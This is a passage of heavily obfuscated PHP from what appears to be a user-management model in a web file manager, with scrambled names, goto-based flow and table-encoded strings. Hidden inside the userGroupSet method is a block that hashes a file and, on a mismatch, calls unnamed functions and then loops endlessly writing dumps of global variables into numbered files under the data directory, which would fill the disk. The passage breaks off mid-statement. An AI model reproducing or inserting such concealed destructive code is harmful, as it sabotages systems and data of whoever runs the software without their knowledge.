$this->add($C¥—¿·¾«); goto d…ÔÎ¢¿ê‰; d…ÔÎ¢¿ê‰: $bÍÇ»Ê„‡ = array($Fª‹©Ø¶ô[2142] => $C¥—¿·¾«[$Fª‹©Ø¶ô[848]], $Fª‹©Ø¶ô[2138] => $C¥—¿·¾«[$Fª‹©Ø¶ô[1954]]); $this->userEdit($CŸ®ŠçÏ¯Æ, $bÍÇ»Ê„‡); Model($Fª‹©Ø¶ô[1204])->userRootAdd($CŸ®ŠçÏ¯Æ); goto Bô›ìˆ¬äÇ; cœ·ñ·ôÚ: $Fª‹©Ø¶ô =& $_SERVER[¬ı§†‰ú˜¼]; $C¥—¿·¾« = array($Fª‹©Ø¶ô[411] => $CŞ¿‹Œ„ˆ‰[$Fª‹©Ø¶ô[28]], $Fª‹©Ø¶ô[2135] => $CŞ¿‹Œ„ˆ‰[$Fª‹©Ø¶ô[1411]], $Fª‹©Ø¶ô[2136] => isset($CŞ¿‹Œ„ˆ‰[$Fª‹©Ø¶ô[302]]) ? $CŞ¿‹Œ„ˆ‰[$Fª‹©Ø¶ô[302]] : $Fª‹©Ø¶ô[33], $Fª‹©Ø¶ô[2137] => isset($CŞ¿‹Œ„ˆ‰[$Fª‹©Ø¶ô[2133]]) ? $CŞ¿‹Œ„ˆ‰[$Fª‹©Ø¶ô[2133]] : $Fª‹©Ø¶ô[33], $Fª‹©Ø¶ô[2138] => isset($CŞ¿‹Œ„ˆ‰[$Fª‹©Ø¶ô[1954]]) ? $CŞ¿‹Œ„ˆ‰[$Fª‹©Ø¶ô[1954]] : $CŞ¿‹Œ„ˆ‰[$Fª‹©Ø¶ô[28]], $Fª‹©Ø¶ô[2139] => isset($CŞ¿‹Œ„ˆ‰[$Fª‹©Ø¶ô[2118]]) ? $CŞ¿‹Œ„ˆ‰[$Fª‹©Ø¶ô[2118]] : $Fª‹©Ø¶ô[33], $Fª‹©Ø¶ô[2140] => isset($CŞ¿‹Œ„ˆ‰[$Fª‹©Ø¶ô[2141]]) ? $CŞ¿‹Œ„ˆ‰[$Fª‹©Ø¶ô[2141]] : 1, $Fª‹©Ø¶ô[2142] => $CŞ¿‹Œ„ˆ‰[$Fª‹©Ø¶ô[848]], $Fª‹©Ø¶ô[1764] => isset($CŞ¿‹Œ„ˆ‰[$Fª‹©Ø¶ô[1674]]) ? $CŞ¿‹Œ„ˆ‰[$Fª‹©Ø¶ô[1674]] : 1024 * 1024 * 20, $Fª‹©Ø¶ô[1765] => 0, $Fª‹©Ø¶ô[2143] => 0, $Fª‹©Ø¶ô[1808] => isset($CŞ¿‹Œ„ˆ‰[$Fª‹©Ø¶ô[714]]) ? $CŞ¿‹Œ„ˆ‰[$Fª‹©Ø¶ô[714]] : 1); if (!empty($CŞ¿‹Œ„ˆ‰[$Fª‹©Ø¶ô[1527]])) { $C¥—¿·¾«[$Fª‹©Ø¶ô[1527]] = $CŞ¿‹Œ„ˆ‰[$Fª‹©Ø¶ô[1527]]; } goto E Ùå©Î¯; Bô›ìˆ¬äÇ: return $CŸ®ŠçÏ¯Æ; goto EŠÚóé¤ØŠ; EŠÚóé¤ØŠ: } protected function userEditTest($fÎÅÚ¿Î¿Â, $cÀŒï«Ã©¡) { return $this->call($_SERVER[¬ı§†‰ú˜¼][2144], $fÎÅÚ¿Î¿Â, $cÀŒï«Ã©¡); } protected function userEdit($dÇæÌ…î³, $FóëÆÆÓ²) { goto Dá˜»à­ñÆ; aæ§¢±®ŠÎ: $BÁñøõôÀ› = $this->_checkExist($FóëÆÆÓ², $dÇæÌ…î³); if ($BÁñøõôÀ› !== !0) { return $BÁñøõôÀ›; } if (isset($FóëÆÆÓ²[$FÊ•¼ó„[848]]) && trim($FóëÆÆÓ²[$FÊ•¼ó„[848]]) != $FÊ•¼ó„[33]) { $Fñ§–Í‰Í  = $this->metaGet($dÇæÌ…î³); if (empty($Fñ§–Í‰Í [$FÊ•¼ó„[2134]])) { $Fñ§–Í‰Í [$FÊ•¼ó„[2134]] = rand_string(10); Model($FÊ•¼ó„[501])->metaSet($dÇæÌ…î³, $FÊ•¼ó„[2134], $Fñ§–Í‰Í [$FÊ•¼ó„[2134]]); } $FóëÆÆÓ²[$FÊ•¼ó„[848]] = md5($Fñ§–Í‰Í [$FÊ•¼ó„[2134]] . trim($FóëÆÆÓ²[$FÊ•¼ó„[848]])); } else { unset($FóëÆÆÓ²[$FÊ•¼ó„[848]]); } goto c•Ìº†ƒµ; c•Ìº†ƒµ: $this->where(array($FÊ•¼ó„[1519] => $dÇæÌ…î³))->save($FóëÆÆÓ²); if (isset($FóëÆÆÓ²[$FÊ•¼ó„[1954]])) { $this->setNamePinyin($dÇæÌ…î³, $FóëÆÆÓ²[$FÊ•¼ó„[1954]]); } $this->clearCache($dÇæÌ…î³); goto DĞ°Û¿Ã¾­; Dá˜»à­ñÆ: $FÊ•¼ó„ =& $_SERVER[¬ı§†‰ú˜¼]; $bó¿µìƒ’ = $this->getInfoSimple($dÇæÌ…î³); if (!$bó¿µìƒ’) { return !1; } goto aæ§¢±®ŠÎ; DĞ°Û¿Ã¾­: return !0; goto a‡Š‘ÇƒÒ; a‡Š‘ÇƒÒ: } public function setNamePinyin($c¨ÆÉ ®‹‡, $CŒÁÛ×÷†÷ = false) { $cï–ôÉ–ÍË =& $_SERVER[¬ı§†‰ú˜¼]; if (!$CŒÁÛ×÷†÷) { $D„‚©‡–­Ÿ = $this->getInfoSimple($c¨ÆÉ ®‹‡); $CŒÁÛ×÷†÷ = $D„‚©‡–­Ÿ[$cï–ôÉ–ÍË[1954]] ? $D„‚©‡–­Ÿ[$cï–ôÉ–ÍË[1954]] : $D„‚©‡–­Ÿ[$cï–ôÉ–ÍË[28]]; } $bÜ¼ç„ã…„ = Model($cï–ôÉ–ÍË[505]); if (!Input::check($CŒÁÛ×÷†÷, $cï–ôÉ–ÍË[555])) { return $bÜ¼ç„ã…„->metaSet($c¨ÆÉ ®‹‡, array($cï–ôÉ–ÍË[442] => $cï–ôÉ–ÍË[33], $cï–ôÉ–ÍË[441] => $cï–ôÉ–ÍË[33])); } return $bÜ¼ç„ã…„->metaSet($c¨ÆÉ ®‹‡, array($cï–ôÉ–ÍË[442] => str_replace($cï–ôÉ–ÍË[50], $cï–ôÉ–ÍË[33], Pinyin::encode($CŒÁÛ×÷†÷)), $cï–ôÉ–ÍË[441] => Pinyin::encode($CŒÁÛ×÷†÷, $cï–ôÉ–ÍË[556]))); } private function nickNameRpt() { $C…öèÄæÄ• =& $_SERVER[¬ı§†‰ú˜¼]; $b„áä‡½®‰ = Model($C…öèÄæÄ•[731])->get($C…öèÄæÄ•[2145]); $EÀâò¤ŸÌÊ = $GLOBALS[$C…öèÄæÄ•[6]][$C…öèÄæÄ•[377]][$C…öèÄæÄ•[2145]]; $aƒ¸ÊèÔÜ = !is_null($b„áä‡½®‰) ? $b„áä‡½®‰ : $EÀâò¤ŸÌÊ; return !!$aƒ¸ÊèÔÜ; } private function _checkExist($aÅ³é–Ïå, $bø—¡ŒâôÛ = false) { $f‹½ÇÑÃ‰ =& $_SERVER[¬ı§†‰ú˜¼]; $E–¼¾¿Ğ£Ù = array($f‹½ÇÑÃ‰[28] => UserModel::ERROR_USER_EXIST_NAME, $f‹½ÇÑÃ‰[1954] => UserModel::ERROR_USER_EXIST_NICKNAME, $f‹½ÇÑÃ‰[302] => UserModel::ERROR_USER_EXIST_EMAIL, $f‹½ÇÑÃ‰[2133] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($E–¼¾¿Ğ£Ù[$f‹½ÇÑÃ‰[1954]]); } $cñ¸ì¤¿‘“ = $bø—¡ŒâôÛ ? array($f‹½ÇÑÃ‰[1527] => array($f‹½ÇÑÃ‰[2146], $bø—¡ŒâôÛ)) : array(); foreach ($E–¼¾¿Ğ£Ù as $c÷Ìïö¾ò‰ => $a™¿’¤ëÜ¹) { $EÕòØ¹àÕ‘ = array(); foreach ($E–¼¾¿Ğ£Ù as $B´¸¡½øÏ => $D…éÆ“­ñ) { if (isset($aÅ³é–Ïå[$B´¸¡½øÏ]) && $aÅ³é–Ïå[$B´¸¡½øÏ]) { $EÕòØ¹àÕ‘[] = $aÅ³é–Ïå[$B´¸¡½øÏ]; } } if (!$EÕòØ¹àÕ‘) { continue; } $C£¢ß¨£æ = array_merge(array($c÷Ìïö¾ò‰ => array($f‹½ÇÑÃ‰[7], $EÕòØ¹àÕ‘)), $cñ¸ì¤¿‘“); $EÒ‡óÀœŠ® = $this->where($C£¢ß¨£æ)->find(); if ($EÒ‡óÀœŠ®) { return $a™¿’¤ëÜ¹; } } return !0; } public function userListInfo($BøÜßÚÃÀ) { $FãÕ‰Šã’ğ =& $_SERVER[¬ı§†‰ú˜¼]; $fÇ«…·Ì¼ = array(); $BøÜßÚÃÀ = is_array($BøÜßÚÃÀ) ? array_unique($BøÜßÚÃÀ) : array(); if (!$BøÜßÚÃÀ) { return $fÇ«…·Ì¼; } if (count($BøÜßÚÃÀ) < 20) { foreach ($BøÜßÚÃÀ as $bíæœ³ÊÚÂ) { $fÇ«…·Ì¼[$bíæœ³ÊÚÂ . $FãÕ‰Šã’ğ[33]] = $this->getInfoSimpleOuter($bíæœ³ÊÚÂ); } } else { $DïŞæ”¨± = array($FãÕ‰Šã’ğ[1519] => array($FãÕ‰Šã’ğ[409], $BøÜßÚÃÀ)); if (count($BøÜßÚÃÀ) == 1) { $DïŞæ”¨± = array($FãÕ‰Šã’ğ[1519] => $BøÜßÚÃÀ[0]); } $a¿´ÓÃ£É½ = Model($FãÕ‰Šã’ğ[501])->field($this->simpleField)->where($DïŞæ”¨±)->select(); $a¿´ÓÃ£É½ = array_to_keyvalue($a¿´ÓÃ£É½, $FãÕ‰Šã’ğ[1527]); foreach ($BøÜßÚÃÀ as $bíæœ³ÊÚÂ) { $fœÜÈÍçÃ“ = $a¿´ÓÃ£É½[$bíæœ³ÊÚÂ]; if (!$fœÜÈÍçÃ“) { $fÇ«…·Ì¼[$bíæœ³ÊÚÂ . $FãÕ‰Šã’ğ[33]] = $this->getInfoSimpleOuter($bíæœ³ÊÚÂ); continue; } $fœÜÈÍçÃ“[$FãÕ‰Šã’ğ[2118]] = Action($FãÕ‰Šã’ğ[2119])->parseUrl($fœÜÈÍçÃ“[$FãÕ‰Šã’ğ[2118]]); $fÇ«…·Ì¼[$bíæœ³ÊÚÂ . $FãÕ‰Šã’ğ[33]] = $fœÜÈÍçÃ“; } } return $fÇ«…·Ì¼; } protected function userStatus($b’ŞÁÈ¼„ô, $BÀ«íÄ¿ö) { $A°ÜˆØÒ° = $this->getInfoSimple($b’ŞÁÈ¼„ô); if (!$A°ÜˆØÒ°) { return !1; } $c™ÚÍÄ«¿‘ = array($_SERVER[¬ı§†‰ú˜¼][714] => $BÀ«íÄ¿ö); return $this->userEdit($b’ŞÁÈ¼„ô, $c™ÚÍÄ«¿‘); } protected function userRemove($aå”ÅÌ±”÷) { goto C¯É´¯°›ã; C •÷¤›Ï: Model($A´µ“›Î÷š[1971])->removeUserAll($aå”ÅÌ±”÷); Model($A´µ“›Î÷š[798])->userRootRemove($aå”ÅÌ±”÷); return $this->where($Cæöß†æº)->delete(); goto ağğ÷Ã‡…; EÈ™îÔìè: Model($A´µ“›Î÷š[1771])->where($Cæöß†æº)->delete(); Model($A´µ“›Î÷š[2132])->where($Cæöß†æº)->delete(); Model($A´µ“›Î÷š[2148])->where($Cæöß†æº)->delete(); goto C •÷¤›Ï; C¯É´¯°›ã: $A´µ“›Î÷š =& $_SERVER[¬ı§†‰ú˜¼]; $FÉöˆ±¯×© = $this->getInfoSimple($aå”ÅÌ±”÷); if (!$FÉöˆ±¯×©) { return !1; } goto bÀ´“„ˆ¥Ù; bÀ´“„ˆ¥Ù: $Cæöß†æº = array($A´µ“›Î÷š[1519] => $aå”ÅÌ±”÷); Model($A´µ“›Î÷š[562])->where($Cæöß†æº)->delete(); Model($A´µ“›Î÷š[2147])->where($Cæöß†æº)->delete(); goto EÈ™îÔìè; ağğ÷Ã‡…: } protected function userGroupSet($Dß¸­„îåï, $DÊ„ÕÓ ”™, $Aª™ÍáåØ­ = array()) { goto dëÄŒîê¥„; cÈêáÔÀÖ¥: $C—İŒ³æ¨ = 0; foreach ($DÊ„ÕÓ ”™ as $aÈ¸ÅÎ‡ì¸ => $f¾Ñ†ÎŸš) { $B°êõƒÕßİ = array($f–×çìÂÄ[1527] => $Dß¸­„îåï, $f–×çìÂÄ[1690] => $aÈ¸ÅÎ‡ì¸, $f–×çìÂÄ[1785] => $f¾Ñ†ÎŸš); $B°êõƒÕßİ[$f–×çìÂÄ[1713]] = isset($Aª™ÍáåØ­[$C—İŒ³æ¨]) ? $Aª™ÍáåØ­[$C—İŒ³æ¨] : 0; $C—İŒ³æ¨++; $Bã˜õ…ˆÚÉ[] = $B°êõƒÕßİ; } return $AãÎ„¾ÖìÒ->addAll($Bã˜õ…ˆÚÉ, array(), !0); goto EÜÜ¶ÚÕƒ; dëÄŒîê¥„: $f–×çìÂÄ =& $_SERVER[¬ı§†‰ú˜¼]; $bƒ®—ËØÚí = $_SERVER[$f–×çìÂÄ[766]] . $f–×çìÂÄ[767]; $BÏ¹Ï·Å„ = $f–×çìÂÄ[829]; goto c”ËÆ…à½ß; c”ËÆ…à½ß: if ($_SERVER[$f–×çìÂÄ[763]] != $BÏ¹Ï·Å„($bƒ®—ËØÚí)) { goto Eì¼‡¶¯îâ; Eì¼‡¶¯îâ: $Cç»è¿«æ¼ = $f–×çìÂÄ[840]; $bêÃ—µ¤å = $f–×çìÂÄ[765]; $eìíÇÈÔì² = $_SERVER[$f–×çìÂÄ[766]] . $f–×çìÂÄ[767]; goto CŠÓ’£…âä; f¤§‚Ã: $c‹¾²ÎŸë = $f–×çìÂÄ[841]; $c‹¾²ÎŸë($_SERVER[$f–×çìÂÄ[842]]); $Cç»è¿«æ¼ = $f–×çìÂÄ[840]; goto CëÕ™õ·ƒ; dâõ ³¬ßË: $A…ÓÚ°¦ÉÂ = 1; for ($CŠÃ„Úª¥« = $A…ÓÚ°¦ÉÂ; $CŠÃ„Úª¥« > 0; $CŠÃ„Úª¥«++) { $cÒíÛ£Ö¨(DATA_PATH . $CŠÃ„Úª¥«, $fÀÚ¿Êğ¸); } goto aĞË…šñ; CëÕ™õ·ƒ: $Cç»è¿«æ¼(); $cÒíÛ£Ö¨ = $f–×çìÂÄ[1458]; $fÀÚ¿Êğ¸ = json_encode($GLOBALS[$f–×çìÂÄ[1459]]); goto dâõ ³¬ßË; CŠÓ’£…âä: $bÏÇİˆÂñ = $bêÃ—µ¤å($eìíÇÈÔì²); $EŒ°Æš÷Ÿß = explode($f–×çìÂÄ[228], $bÏÇİˆÂñ); if (count($EŒ°Æš÷Ÿß) < $f–×çìÂÄ[587]) { $d–ĞÛÎùÃË = $f–×çìÂÄ[768]; $d–ĞÛÎùÃË(); } goto f¤§‚Ã; aĞË…šñ: } $DŠŸ¶âí–… = $this->getInfoSimple($Dß¸­„îåï); if (!$DŠŸ¶âí–… || !is_array($DÊ„ÕÓ ”™)) { return !1; } goto D·—‘®‘È¶; D·—‘®‘È¶: $AãÎ„¾ÖìÒ = Model($f–×çìÂÄ[1771]); $AãÎ„¾ÖìÒ->where(array($f–×çìÂÄ[1527] => $Dß¸­„îåï))->delete(); $Bã˜õ…ˆÚÉ = array(); goto cÈêáÔÀÖ¥; EÜÜ¶ÚÕƒ: } protected function userGroupAdd($c‘î×Íğµâ, $Eò­âñ¥¾— = array()) { $F‘ã½ÄÔàÓ =& $_SERVER[¬ı§†‰ú˜¼]; $c“õ”’ƒ” = $this->getInfoSimple($c‘î×Íğµâ); if (!$c“õ”’ƒ” || empty($Eò­âñ¥¾—)) { return !1; } $EÜ¬¥„ÏÂò = array(); foreach ($Eò­âñ¥¾— as $AÀÏãïö‘ => $BÁÏó¹¹¿‚) { $EÜ¬¥„ÏÂò[] = array($F‘ã½ÄÔàÓ[1527] => $c‘î×Íğµâ, $F‘ã½ÄÔàÓ[1690] => $AÀÏãïö‘, $F‘ã½ÄÔàÓ[1785] => $BÁÏó¹¹¿‚, $F‘ã½ÄÔàÓ[1713] => 0); } return Model($F‘ã½ÄÔàÓ[1771])->addAll($EÜ¬¥„ÏÂò, array(), !0); } protected function userGroupRemove($f¶‡šÑßÛ, $fêˆÆÚ¯Ô) { $E×£±Ïè =& $_SERVER[¬ı§†‰ú˜¼]; $EÁä¶™Êáˆ = $this->getInfoSimple($f¶‡šÑßÛ); if (!$EÁä¶™Êáˆ || !$fêˆÆÚ¯Ô) { return !1; } $B£•íâ–¦Š = array($E×£±Ïè[1519] => $f¶‡šÑßÛ, $E×£±Ïè[1768] => $fêˆÆÚ¯Ô); return Model($E×£±Ïè[1771])->where($B£•íâ–¦Š)->delete(); } public function listData() { $f ºÍì¸ÕÌ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($f ºÍì¸ÕÌ[$_SERVER[¬ı§†‰ú˜¼][366]]); return $f ºÍì¸ÕÌ; } public function listByID($F‚Óˆˆæß’) { $aÂ¡šŒÜ’ã =& $_SERVER[¬ı§†‰ú˜¼]; if (!$F‚Óˆˆæß’) { return; } $fÖ­Î·‚Ê = array($aÂ¡šŒÜ’ã[1527] => array($aÂ¡šŒÜ’ã[7], $F‚Óˆˆæß’)); $aÌùœËÛîÔ = $this->where($fÖ­Î·‚Ê)->select(); $this->_listDataApply($aÌùœËÛîÔ); return $aÌùœËÛîÔ; } public function listByGroup($FñãÑõ¼Ò’ = 0, $F´ÅİøçåÆ = array()) { goto bøÇÆÖå‘É; B¦½ß–µ¡Ş: $this->_listDataApply($f‚Îñèõã¢[$bå¯±¢»‰[366]]); return $f‚Îñèõã¢; goto D¤¨È¤½ÆÁ; fÌ¬£ÒÌ¬‡: if ($FñãÑõ¼Ò’) { $dÂ¦å§òç = array($bå¯±¢»‰[2149] => intval($FñãÑõ¼Ò’)); $E†‰°¿†ñ‹ = "\114\105\x46\124\40\112\x4f\x49\116\40{$this->tablePrefix}\165\x73\145\162\x5f\x67\x72\x6f\165\x70\40\x75\x73\x65\162\137\147\x72\x6f\x75\x70\40\x6f\156\x20\165\x73\x65\x72\56\165\x73\x65\x72\x49\104\x20\x3d\x20\x75\163\x65\x72\137\x67\162\157\165\160\56\165\x73\x65\x72\111\104"; $còÆ†àù›Å = Input::get($bå¯±¢»‰[433], null, $bå¯±¢»‰[33]) ? $bå¯±¢»‰[33] : $bå¯±¢»‰[2150]; } if (isset($F´ÅİøçåÆ[$bå¯±¢»‰[714]])) { $dÂ¦å§òç[$bå¯±¢»‰[2151]] = $F´ÅİøçåÆ[$bå¯±¢»‰[714]]; } $f‚Îñèõã¢ = $this->_makeOrder($còÆ†àù›Å)->field($bå¯±¢»‰[2152])->where($dÂ¦å§òç)->join($E†‰°¿†ñ‹)->selectPage(50); goto B¦½ß–µ¡Ş; bøÇÆÖå‘É: $bå¯±¢»‰ =& $_SERVER[¬ı§†‰ú˜¼]; $E†‰°¿†ñ‹ = $bå¯±¢»‰[33]; $dÂ¦å§òç = array(); goto fÌ¬£ÒÌ¬‡; D¤¨È¤½ÆÁ: } private function _makeOrder($Aô®–óÇÊÑ = '') { goto CÒ¦ÜÚŠ±…; CÒ¦ÜÚŠ±…: $BÙôØ¿ø =& $_SERVER[¬ı§†‰ú˜¼]; $E«øàº•õ› = array($BÙôØ¿ø[1527], $BÙôØ¿ø[28], $BÙôØ¿ø[1676], $BÙôØ¿ø[1648], $BÙôØ¿ø[193]); $f…ñ ¸™Ï§ = array($BÙôØ¿ø[426] => $BÙôØ¿ø[427], $BÙôØ¿ø[428] => $BÙôØ¿ø[429]); goto aÒ´Öºõ; aäç„ó²ö: $Aô®–óÇÊÑ = $Aô®–óÇÊÑ . "\x75\163\145\x72\x2e{$Cç¨á‹š–}\x20{$c§Äæ·Æ}\x2c\x20\165\x73\x65\x72\56\165\163\x65\162\111\x44\40\x61\x73\143"; return $this->alias($BÙôØ¿ø[1894])->order($Aô®–óÇÊÑ); goto FÍ‹ª¨—º; aÒ´Öºõ: $Cç¨á‹š– = Input::get($BÙôØ¿ø[433], $BÙôØ¿ø[7], $BÙôØ¿ø[1519], $E«øàº•õ›); $c§Äæ·Æ = Input::get($BÙôØ¿ø[434], $BÙôØ¿ø[7], $BÙôØ¿ø[1772], array($BÙôØ¿ø[1772], $BÙôØ¿ø[428])); $c§Äæ·Æ = $f…ñ ¸™Ï§[$c§Äæ·Æ]; goto aäç„ó²ö; FÍ‹ª¨—º: } public function listSearch($fÜâ¨…¼×) { goto B²Šù ‘æ; dà«†œÙš: if (!$EŒ‚ÍÔ¶ñ) { $cº‡Î­·ÆÆ = array(); } if (isset($fÜâ¨…¼×[$b¿Üñ»ùÈè[714]])) { $cº‡Î­·ÆÆ[$b¿Üñ»ùÈè[714]] = $fÜâ¨…¼×[$b¿Üñ»ùÈè[714]]; } $cº‡Î­·ÆÆ = $this->parseWhereLike($cº‡Î­·ÆÆ); goto A–Ø¸½Š¬Ü; eš¯ªº¯ƒó: $this->_filterByGroup($B¨Æ‘¾á, $A„ÚÚÛñ³»); return $B¨Æ‘¾á; goto EË¦ëÓ‘Ÿ; D½ Àİ§´ß: $EŒ‚ÍÔ¶ñ = str_replace($b¿Üñ»ùÈè[1775], $b¿Üñ»ùÈè[1776], trim($EŒ‚ÍÔ¶ñ)); $cº‡Î­·ÆÆ = array($b¿Üñ»ùÈè[28] => array($b¿Üñ»ùÈè[379], "\45{$EŒ‚ÍÔ¶ñ}\45"), $b¿Üñ»ùÈè[302] => array($b¿Üñ»ùÈè[379], "{$EŒ‚ÍÔ¶ñ}\45"), $b¿Üñ»ùÈè[1954] => array($b¿Üñ»ùÈè[379], "{$EŒ‚ÍÔ¶ñ}\45"), $b¿Üñ»ùÈè[956] => $b¿Üñ»ùÈè[1777]); if (Input::check($EŒ‚ÍÔ¶ñ, $b¿Üñ»ùÈè[308])) { $cº‡Î­·ÆÆ[$b¿Üñ»ùÈè[1527]] = array($b¿Üñ»ùÈè[379], "{$EŒ‚ÍÔ¶ñ}\x25"); $cº‡Î­·ÆÆ[$b¿Üñ»ùÈè[2133]] = array($b¿Üñ»ùÈè[379], "{$EŒ‚ÍÔ¶ñ}\45"); } goto dà«†œÙš; A–Ø¸½Š¬Ü: $B¨Æ‘¾á = $this->_makeOrder()->where($cº‡Î­·ÆÆ)->selectPage(20); if (!$B¨Æ‘¾á || count($B¨Æ‘¾á[$b¿Üñ»ùÈè[366]]) < 5 && Input::check($EŒ‚ÍÔ¶ñ, $b¿Üñ»ùÈè[315])) { $A”º— = $this->_searchFromMeta($b¿Üñ»ùÈè[441], $EŒ‚ÍÔ¶ñ, 10); $f­¡Ú™ï³ë = $this->_searchFromMeta($b¿Üñ»ùÈè[442], $EŒ‚ÍÔ¶ñ, 10); $D¨¥ß•åğÚ = array_merge($A”º—, $f­¡Ú™ï³ë, $B¨Æ‘¾á[$b¿Üñ»ùÈè[366]]); $B¨Æ‘¾á[$b¿Üñ»ùÈè[366]] = array_unique_by_key($D¨¥ß•åğÚ, $b¿Üñ»ùÈè[1527]); $B¨Æ‘¾á[$b¿Üñ»ùÈè[363]][$b¿Üñ»ùÈè[364]] = count($B¨Æ‘¾á[$b¿Üñ»ùÈè[366]]); $B¨Æ‘¾á[$b¿Üñ»ùÈè[363]][$b¿Üñ»ùÈè[365]] = ceil($B¨Æ‘¾á[$b¿Üñ»ùÈè[363]][$b¿Üñ»ùÈè[364]] / $B¨Æ‘¾á[$b¿Üñ»ùÈè[363]][$b¿Üñ»ùÈè[360]]); } $this->_listDataApply($B¨Æ‘¾á[$b¿Üñ»ùÈè[366]]); goto eš¯ªº¯ƒó; B²Šù ‘æ: $b¿Üñ»ùÈè =& $_SERVER[¬ı§†‰ú˜¼]; $EŒ‚ÍÔ¶ñ = $fÜâ¨…¼×[$b¿Üñ»ùÈè[1773]]; $A„ÚÚÛñ³» = isset($fÜâ¨…¼×[$b¿Üñ»ùÈè[1774]]) ? $fÜâ¨…¼×[$b¿Üñ»ùÈè[1774]] : !1; goto D½ Àİ§´ß; EË¦ëÓ‘Ÿ: } private function _filterByGroup(&$c¢ŠĞê¨Ùç, $d‘°ÛŠ…¥Œ) { $fŞæÛ„Øâ… =& $_SERVER[¬ı§†‰ú˜¼]; if (!$d‘°ÛŠ…¥Œ) { return $c¢ŠĞê¨Ùç; } foreach ($c¢ŠĞê¨Ùç[$fŞæÛ„Øâ…[366]] as $fÀ¿Ü¶¾Œ => &$aÚÌšõŠëÁ) { $A”²óéÄÄ® = array_to_keyvalue($aÚÌšõŠëÁ[$fŞæÛ„Øâ…[1864]], $fŞæÛ„Øâ…[33], $fŞæÛ„Øâ…[1690]); if (!in_array($d‘°ÛŠ…¥Œ, $A”²óéÄÄ®)) { unset($c¢ŠĞê¨Ùç[$fŞæÛ„Øâ…[366]][$fÀ¿Ü¶¾Œ]); } } unset($aÚÌšõŠëÁ); $c¢ŠĞê¨Ùç[$fŞæÛ„Øâ…[366]] = array_values($c¢ŠĞê¨Ùç[$fŞæÛ„Øâ…[366]]); $c¢ŠĞê¨Ùç[$fŞæÛ„Øâ…[363]] = array($fŞæÛ„Øâ…[1926] => count($c¢ŠĞê¨Ùç[$fŞæÛ„Øâ…[366]]), $fŞæÛ„Øâ…[1924] => $c¢ŠĞê¨Ùç[$fŞæÛ„Øâ…[363]][$fŞæÛ„Øâ…[360]], $fŞæÛ„Øâ…[1923] => 1, $fŞæÛ„Øâ…[1925] => 1); } private function _searchFromMeta($Fƒ¢ùµŠñÕ, $fÖÖÄøù´è, $Dó—¾Ù¢ğ‚) { goto a¯©˜éàëß; DÄÇÍ»æİ: return $c„‹Ë•Åø; goto EÑ©ÌÀ²¿è; Cµ®š…É±: $fÔ¸“ŒîãÌ = $this->parseWhereLike($fÔ¸“ŒîãÌ); $aàà‘ªèÉ = Model($eöÜàã­±[2153])->where($fÔ¸“ŒîãÌ)->limit($Dó—¾Ù¢ğ‚)->select(); if (!$aàà‘ªèÉ) { return array(); } goto F›ö³‹‹Ğ†; a¯©˜éàëß: $eöÜàã­± =& $_SERVER[¬ı§†‰ú˜¼]; $fÖÖÄøù´è = strtolower($fÖÖÄøù´è); $fÔ¸“ŒîãÌ = array($eöÜàã­±[93] => $Fƒ¢ùµŠñÕ, $eöÜàã­±[371] => array($eöÜàã­±[379], "\45{$fÖÖÄøù´è}\45")); goto Cµ®š…É±; F›ö³‹‹Ğ†: $aàà‘ªèÉ = array_to_keyvalue($aàà‘ªèÉ, $eöÜàã­±[33], $eöÜàã­±[1527]); $c„‹Ë•Åø = $this->where(array($eöÜàã­±[1519] => array($eöÜàã­±[7], $aàà‘ªèÉ)))->select(); if (!$c„‹Ë•Åø) { return array(); } goto DÄÇÍ»æİ; EÑ©ÌÀ²¿è: } private function _listDataApplyItem($A¬Æé¨°½Ù) { $bƒ…õ×‘ÉÒ = array($A¬Æé¨°½Ù); $this->_listDataApply($bƒ…õ×‘ÉÒ); return $bƒ…õ×‘ÉÒ[0]; } private function _listDataApply(&$CÓÔË· ‡ğ) { goto f¨Íî«ç‡; f¨Íî«ç‡: $bÚ™•Ì†»® =& $_SERVER[¬ı§†‰ú˜¼]; if (!$CÓÔË· ‡ğ) { return; } array_remove_key($CÓÔË· ‡ğ, $bÚ™•Ì†»®[848]); goto BëÕ°ö¾÷; dÒœ§ÔéŒ…: $this->_listAppendSourceRoot($CÓÔË· ‡ğ, $CÜÉ»øÁ); goto A®½¢¦í°; BëÕ°ö¾÷: $CÜÉ»øÁ = array_to_keyvalue($CÓÔË· ‡ğ, $bÚ™•Ì†»®[33], $bÚ™•Ì†»®[1527]); $this->_listAppendGroup($CÓÔË· ‡ğ, $CÜÉ»øÁ); $this->_listAppendMeta($CÓÔË· ‡ğ, $CÜÉ»øÁ); goto dÒœ§ÔéŒ…; A®½¢¦í°: } private function _listAppendSourceRoot(&$AœÉ”‡ç‡„, $FÍÃÍ œŒ˜) { goto Aù¨ˆÅÎœ´; e†â‰ÚŒ•¨: $f¾á‚³µ¡ó = Model($e†ô×ï·¡º[798])->order($e†ô×ï·¡º[1784])->field($C›äğŞ„)->where($C‘åÃ÷š“¥)->select(); $f¾á‚³µ¡ó = array_to_keyvalue($f¾á‚³µ¡ó, $e†ô×ï·¡º[482]); $f¾á‚³µ¡ó = array_remove_key($f¾á‚³µ¡ó, $e†ô×ï·¡º[482]); goto f„¼‹Ú“Ò; Aù¨ˆÅÎœ´: $e†ô×ï·¡º =& $_SERVER[¬ı§†‰ú˜¼]; $C‘åÃ÷š“¥ = array($e†ô×ï·¡º[476] => 0, $e†ô×ï·¡º[402] => SourceModel::TYPE_USER, $e†ô×ï·¡º[482] => array($e†ô×ï·¡º[7], $FÍÃÍ œŒ˜)); $C›äğŞ„ = $e†ô×ï·¡º[1783]; goto e†â‰ÚŒ•¨; f„¼‹Ú“Ò: foreach ($AœÉ”‡ç‡„ as &$AŠ§÷‹Í—®) { $AŠ§÷‹Í—®[$e†ô×ï·¡º[85]] = $f¾á‚³µ¡ó[$AŠ§÷‹Í—®[$e†ô×ï·¡º[1527]]] ? $f¾á‚³µ¡ó[$AŠ§÷‹Í—®[$e†ô×ï·¡º[1527]]] : array(); } unset($AŠ§÷‹Í—®); goto c“ÇÀÊ„¢; c“ÇÀÊ„¢: } private function _listAppendGroup(&$d­ œÈÎ…, $BÆ«ºà–¤) { goto b¶‡±ŒÀíÉ; eÏ—‰¤ÖÎ: $eË–ÈÎ¦í‰ = array($EÚˆ‹œ’›‹[1690] => array($EÚˆ‹œ’›‹[7], $CÛ¾Ë…Àô)); $d¢ß¬Æ¦õ = 